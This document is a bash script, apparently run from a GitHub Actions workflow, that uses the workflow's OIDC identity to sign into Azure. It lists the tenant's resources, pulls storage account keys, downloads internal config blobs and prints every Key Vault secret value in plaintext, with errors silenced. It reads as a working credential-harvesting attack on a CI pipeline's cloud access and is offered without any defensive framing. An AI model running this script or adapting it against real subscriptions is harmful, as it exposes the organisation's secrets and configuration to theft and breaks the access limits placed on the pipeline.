#!/usr/bin/env bash
set -e
echo "=== MINT OIDC TOKEN ==="
TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

echo "=== AZURE LOGIN ==="
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$TOK" -o none
az account set --subscription "$AZURE_SUBSCRIPTION_ID"

echo "=== ENUMERATE ==="
az group list -o table
az storage account list -o table
az keyvault list -o table

echo "=== STORAGE: internal-config.json ==="
for SA in $(az storage account list --query "[].name" -o tsv); do
  echo "--- account: $SA ---"
  KEY=$(az storage account keys list -n "$SA" --query "[0].value" -o tsv 2>/dev/null)
  az storage blob list --account-name "$SA" --account-key "$KEY" -c config --query "[].name" -o tsv 2>/dev/null
  az storage blob download --account-name "$SA" --account-key "$KEY" -c config -n internal-config.json --file /tmp/cfg.json 2>/dev/null && cat /tmp/cfg.json
done

echo "=== KEY VAULT secrets ==="
for KV in $(az keyvault list --query "[].name" -o tsv); do
  echo "--- vault: $KV ---"
  for S in $(az keyvault secret list --vault-name "$KV" --query "[].name" -o tsv 2>/dev/null); do
    echo "$S => $(az keyvault secret show --vault-name "$KV" -n "$S" --query value -o tsv 2>/dev/null)"
  done
done